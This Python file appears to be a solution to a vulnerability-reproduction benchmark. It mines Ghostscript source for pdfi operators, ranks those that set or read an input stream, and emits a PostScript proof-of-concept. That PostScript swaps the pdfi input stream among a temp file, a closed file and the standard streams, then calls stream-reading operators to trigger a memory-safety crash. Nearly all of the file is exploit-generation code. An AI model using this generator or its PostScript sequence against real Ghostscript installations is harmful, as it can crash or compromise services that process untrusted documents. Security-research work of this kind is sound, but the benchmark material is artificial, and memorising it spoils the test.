import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def _iter_source_files(self, src_path: str):
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    rel = os.path.relpath(p, src_path)
                    yield rel.replace("\\", "/"), p, None
        else:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    yield name, None, (tf, m)

    def _read_file_text(self, file_path: Optional[str], tar_info) -> Optional[str]:
        try:
            if file_path is not None:
                sz = os.path.getsize(file_path)
                if sz > 8 * 1024 * 1024:
                    return None
                with open(file_path, "rb") as f:
                    data = f.read()
            else:
                tf, m = tar_info
                if m.size > 8 * 1024 * 1024:
                    return None
                ex = tf.extractfile(m)
                if ex is None:
                    return None
                data = ex.read()
        except Exception:
            return None

        lowname = (file_path or "").lower()
        try:
            if lowname.endswith((".ps", ".eps", ".txt")):
                return data.decode("latin-1", errors="ignore")
            return data.decode("utf-8", errors="ignore")
        except Exception:
            try:
                return data.decode("latin-1", errors="ignore")
            except Exception:
                return None

    def _collect_relevant_texts(self, src_path: str) -> Dict[str, str]:
        texts: Dict[str, str] = {}
        exts = (".c", ".h", ".cpp", ".cc", ".ps", ".txt", ".inc")
        for rel, fp, ti in self._iter_source_files(src_path):
            rlow = rel.lower()
            if not rlow.endswith(exts):
                continue
            txt = self._read_file_text(fp, ti)
            if not txt:
                continue
            if "pdfi" in txt.lower() or "op_def" in txt or "opdef" in txt:
                texts[rel] = txt
        return texts

    def _extract_op_defs(self, texts: Dict[str, str]) -> List[Tuple[str, str, str]]:
        op_re = re.compile(r'\{\s*"([^"]+)"\s*,\s*(z[A-Za-z0-9_]+)\s*(?:,|\})')
        out: List[Tuple[str, str, str]] = []
        for fn, txt in texts.items():
            if "{" not in txt or "z" not in txt:
                continue
            for m in op_re.finditer(txt):
                opname, zfunc = m.group(1), m.group(2)
                if "pdfi" in opname.lower() or "pdfi" in zfunc.lower():
                    out.append((opname, zfunc, fn))
        return out

    def _find_func_def(self, txt: str, zfunc: str) -> int:
        patterns = [
            re.compile(r'(?:^|\n)\s*static\s+int\s+' + re.escape(zfunc) + r'\s*\(', re.M),
            re.compile(r'(?:^|\n)\s*int\s+' + re.escape(zfunc) + r'\s*\(', re.M),
        ]
        for p in patterns:
            m = p.search(txt)
            if m:
                return m.start()
        return -1

    def _get_near_comment(self, txt: str, idx: int) -> Optional[str]:
        if idx <= 0:
            return None
        start = max(0, idx - 1200)
        seg = txt[start:idx]
        j = seg.rfind("/*")
        if j < 0:
            return None
        k = seg.find("*/", j + 2)
        if k < 0:
            return None
        comment = seg[j:k + 2]
        if comment.count("\n") > 30:
            return None
        return comment

    def _parse_stack_comment(self, comment: str, opname: str) -> Tuple[Optional[List[str]], Optional[List[str]]]:
        if not comment:
            return None, None
        c = comment
        for tok in ("/*", "*/"):
            c = c.replace(tok, " ")
        c = " ".join(c.split())
        targets = [opname]
        if opname.startswith("."):
            targets.append(opname[1:])
        pos = -1
        used = None
        for t in targets:
            p = c.find(t)
            if p >= 0 and (pos < 0 or p < pos):
                pos = p
                used = t
        if pos < 0:
            return None, None
        before = c[:pos]
        after = c[pos + len(used):]
        in_types = re.findall(r"<([^>]+)>", before)
        out_types = re.findall(r"<([^>]+)>", after)
        return in_types, out_types

    def _infer_check_op_n(self, snippet: str) -> Optional[int]:
        m = re.search(r"\bcheck_op\s*\(\s*(\d+)\s*\)", snippet)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                return None
        m = re.search(r"\bcheck_op\(\s*([0-9]+)\s*\)", snippet)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                return None
        return None

    def _infer_file_index_from_checks(self, snippet: str, n_in: int) -> Optional[int]:
        m = re.search(r"check_type\s*\(\s*\*op\s*,\s*t_file\s*\)", snippet)
        if m:
            return n_in - 1
        m = re.search(r"check_type\s*\(\s*op\[-\s*(\d+)\s*\]\s*,\s*t_file\s*\)", snippet)
        if m:
            k = int(m.group(1))
            return n_in - 1 - k
        m = re.search(r"check_read_file\s*\(\s*\*op\s*\)", snippet)
        if m:
            return n_in - 1
        m = re.search(r"check_read_file\s*\(\s*op\[-\s*(\d+)\s*\]\s*\)", snippet)
        if m:
            k = int(m.group(1))
            return n_in - 1 - k
        return None

    def _infer_operand_roles(
        self,
        opname: str,
        zfunc: str,
        fn: str,
        txt: str,
    ) -> Tuple[int, List[str], int]:
        idx = self._find_func_def(txt, zfunc)
        snippet = ""
        comment = None
        if idx >= 0:
            snippet = txt[idx:idx + 6000]
            comment = self._get_near_comment(txt, idx)

        in_types, out_types = self._parse_stack_comment(comment or "", opname)
        n_in: Optional[int] = None
        if in_types is not None and len(in_types) > 0:
            n_in = len(in_types)
        if n_in is None:
            n_in = self._infer_check_op_n(snippet) or 1

        n_out = 0
        if out_types is not None:
            n_out = len(out_types)

        roles = ["dummy"] * n_in

        file_idx = None
        if in_types:
            for i, t in enumerate(in_types):
                tl = t.lower()
                if "file" in tl or "stream" in tl:
                    file_idx = i
                    break
        if file_idx is None:
            file_idx = self._infer_file_index_from_checks(snippet, n_in)
        if file_idx is None and n_in >= 1 and any(k in opname.lower() for k in ("stream", "file", "input")):
            file_idx = n_in - 1

        if file_idx is not None and 0 <= file_idx < n_in:
            roles[file_idx] = "file"

        if n_in >= 2:
            for i in range(n_in):
                if roles[i] != "file":
                    roles[i] = "ctx"
                    break

        if n_in >= 3:
            for i in range(n_in):
                if roles[i] == "dummy":
                    roles[i] = "dict"
                    break

        return n_in, roles, n_out

    def _rank_set_op(self, opname: str, snippet: str) -> int:
        low = opname.lower()
        s = 0
        if "pdfi" in low:
            s += 20
        if "set" in low:
            s += 20
        if "input" in low:
            s += 15
        if "stream" in low or "file" in low:
            s += 15
        if "open" in low:
            s += 5
        sl = snippet.lower()
        if "input_stream" in sl or "inputstream" in sl:
            s += 15
        if "close" in sl and ("input" in sl or "stream" in sl):
            s += 5
        return s

    def _rank_use_op(self, opname: str, snippet: str, n_in: int) -> int:
        low = opname.lower()
        s = 0
        if "pdfi" in low:
            s += 15
        if any(k in low for k in ("token", "read", "operator", "exec", "parse", "scan", "get", "next")):
            s += 10
        if any(k in low for k in ("stream", "input", "file")):
            s += 5
        if n_in <= 1:
            s += 10
        elif n_in == 2:
            s += 5
        sl = snippet.lower()
        if "input_stream" in sl or "inputstream" in sl:
            s += 12
        if any(k in sl for k in ("sgetc", "sread", "spgetc", "sgets", "stream", "file")):
            s += 6
        if "set" in low:
            s -= 20
        return s

    def _rank_ctx_op(self, opname: str, snippet: str, n_in: int, n_out: int) -> int:
        low = opname.lower()
        s = 0
        if "pdfi" in low:
            s += 10
        if any(k in low for k in ("ctx", "context", "new", "create", "alloc", "init", "begin", "start", "open")):
            s += 15
        if n_out >= 1:
            s += 15
        if n_in == 0:
            s += 10
        elif n_in == 1:
            s += 5
        sl = snippet.lower()
        if "pdfi_ctx" in sl or "context" in sl:
            s += 10
        if "set" in low or "stream" in low:
            s -= 10
        return s

    def _choose_ops(self, texts: Dict[str, str]) -> Tuple[Optional[str], Optional[Tuple[int, List[str], int]], Optional[str], List[Tuple[str, int, List[str], int]], Optional[str]]:
        op_defs = self._extract_op_defs(texts)
        if not op_defs:
            return None, None, None, [], None

        info_cache: Dict[Tuple[str, str, str], Tuple[int, List[str], int, str]] = {}
        def get_info(opname: str, zfunc: str, fn: str) -> Tuple[int, List[str], int, str]:
            key = (opname, zfunc, fn)
            if key in info_cache:
                return info_cache[key]
            txt = texts.get(fn, "")
            idx = self._find_func_def(txt, zfunc)
            snippet = txt[idx:idx + 6000] if idx >= 0 else ""
            n_in, roles, n_out = self._infer_operand_roles(opname, zfunc, fn, txt)
            info_cache[key] = (n_in, roles, n_out, snippet)
            return info_cache[key]

        set_best = None
        set_best_score = -10**9
        set_best_details = None

        for opname, zfunc, fn in op_defs:
            n_in, roles, n_out, snippet = get_info(opname, zfunc, fn)
            score = self._rank_set_op(opname, snippet)
            if score > set_best_score:
                set_best_score = score
                set_best = opname
                set_best_details = (n_in, roles, n_out)

        use_candidates: List[Tuple[int, str, int, List[str], int]] = []
        for opname, zfunc, fn in op_defs:
            if set_best and opname == set_best:
                continue
            n_in, roles, n_out, snippet = get_info(opname, zfunc, fn)
            if "pdfi" not in opname.lower():
                continue
            if "stream" not in snippet.lower() and "input" not in snippet.lower() and "sgetc" not in snippet.lower():
                continue
            score = self._rank_use_op(opname, snippet, n_in)
            use_candidates.append((score, opname, n_in, roles, n_out))

        use_candidates.sort(reverse=True, key=lambda x: x[0])
        use_selected: List[Tuple[str, int, List[str], int]] = []
        for sc, opname, n_in, roles, n_out in use_candidates[:8]:
            use_selected.append((opname, n_in, roles, n_out))

        ctx_best = None
        ctx_best_score = -10**9
        for opname, zfunc, fn in op_defs:
            n_in, roles, n_out, snippet = get_info(opname, zfunc, fn)
            sc = self._rank_ctx_op(opname, snippet, n_in, n_out)
            if sc > ctx_best_score:
                ctx_best_score = sc
                ctx_best = opname

        return set_best, set_best_details, (use_selected[0][0] if use_selected else None), use_selected, ctx_best

    def _ps_push_for_role(self, role: str, var_file: str = "f") -> str:
        r = role.lower()
        if r == "file":
            return var_file
        if r == "ctx":
            return "ctx"
        if r == "dict":
            return "<<>>"
        if r in ("int", "integer", "num", "number"):
            return "0"
        if r == "bool" or r == "boolean":
            return "true"
        if r == "string":
            return "()"
        if r == "name":
            return "/N"
        return "null"

    def _emit_proc_callop(self, opname: str) -> str:
        safe = opname.replace("\\", "_")
        return f"S /{safe} get exec"

    def _build_poc(self, set_op: str, set_details: Tuple[int, List[str], int], use_ops: List[Tuple[str, int, List[str], int]], ctx_op: Optional[str]) -> bytes:
        set_n_in, set_roles, _ = set_details

        chosen_use_ops = use_ops[:5] if use_ops else []
        if not chosen_use_ops:
            chosen_use_ops = []

        ctx_needed = ("ctx" in set_roles)
        for _, n_in, roles, _ in chosen_use_ops:
            if "ctx" in roles:
                ctx_needed = True

        parts: List[str] = []
        parts.append("%!\n")
        parts.append("/S systemdict def\n")
        parts.append("/mkvalid {\n")
        parts.append("  (%tmpfile) (w+) file\n")
        parts.append("  dup (%PDF-1.4\\n) writestring\n")
        parts.append("  dup (1 0 obj<<>>endobj\\ntrailer<<>>\\n%%EOF\\n) writestring\n")
        parts.append("  dup flushfile\n")
        parts.append("  dup 0 setfileposition\n")
        parts.append("} bind def\n")
        parts.append("/ctx null def\n")

        if ctx_needed and ctx_op:
            parts.append(f"S /{ctx_op} known {{\n")
            parts.append("  { S /" + ctx_op + " get exec /ctx exch def } stopped pop\n")
            parts.append("} if\n")

        parts.append("/SET {\n")
        parts.append("  /f exch def\n")
        for role in set_roles:
            parts.append("  " + self._ps_push_for_role(role, "f") + "\n")
        parts.append("  " + self._emit_proc_callop(set_op) + "\n")
        parts.append("} bind def\n")

        for i, (uop, n_in, roles, _) in enumerate(chosen_use_ops):
            parts.append(f"/USE{i} {{\n")
            for role in roles:
                parts.append("  " + self._ps_push_for_role(role, "f") + "\n")
            parts.append("  " + self._emit_proc_callop(uop) + "\n")
            parts.append("} bind def\n")

        parts.append("/setvalid { { mkvalid SET } stopped pop } bind def\n")

        parts.append("{\n")
        parts.append("  setvalid\n")

        def call_all_use():
            s = ""
            for i in range(len(chosen_use_ops)):
                s += f"  {{ USE{i} }} stopped pop\n"
            return s

        parts.append("  { 0 SET } stopped pop\n")
        parts.append(call_all_use())
        parts.append("  setvalid\n")

        parts.append("  /cf mkvalid def cf closefile\n")
        parts.append("  { cf SET } stopped pop\n")
        parts.append(call_all_use())
        parts.append("  setvalid\n")

        parts.append("  { (%stdout) (w) file SET } stopped pop\n")
        parts.append(call_all_use())
        parts.append("  setvalid\n")

        parts.append("  { (%stderr) (w) file SET } stopped pop\n")
        parts.append(call_all_use())
        parts.append("  setvalid\n")

        parts.append("  { (%stdin) (r) file SET } stopped pop\n")
        parts.append(call_all_use())
        parts.append("  setvalid\n")

        parts.append("} stopped pop\n")
        parts.append("quit\n")

        return "".join(parts).encode("latin-1", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        try:
            texts = self._collect_relevant_texts(src_path)
        except Exception:
            texts = {}

        set_op, set_details, _, use_ops, ctx_op = self._choose_ops(texts)

        if not set_op or not set_details:
            fallback = (
                "%!\n"
                "/S systemdict def\n"
                "/mkvalid { (%tmpfile) (w+) file dup (%PDF-1.4\\n%%EOF\\n) writestring dup flushfile dup 0 setfileposition } bind def\n"
                "/ctx null def\n"
                "{\n"
                "  mkvalid pop\n"
                "} stopped pop\n"
                "quit\n"
            )
            return fallback.encode("latin-1", errors="ignore")

        return self._build_poc(set_op, set_details, use_ops, ctx_op)